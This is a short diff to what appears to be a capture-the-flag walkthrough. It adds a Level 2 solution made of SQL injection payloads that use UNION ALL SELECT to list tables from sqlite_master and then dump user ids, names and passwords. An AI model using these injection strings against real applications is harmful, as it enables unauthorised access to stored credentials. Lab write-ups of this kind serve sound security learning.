@@ -38,7 +38,10 @@
 		* ![Level1](img/level_1.PNG)	
 
 	* Level 2
-		* Answer		
+		* input=1+Union+ALL+SELECT+1,2,3,name+from+sqlite_master
+		* the users table became OTg5ZmMyZWM1 table
+		* input=1+Union+ALL+SELECT+1,id,name,password+from+OTg5ZmMyZWM1	
+		* ![Level2](img/level_2.PNG)
 
 
 
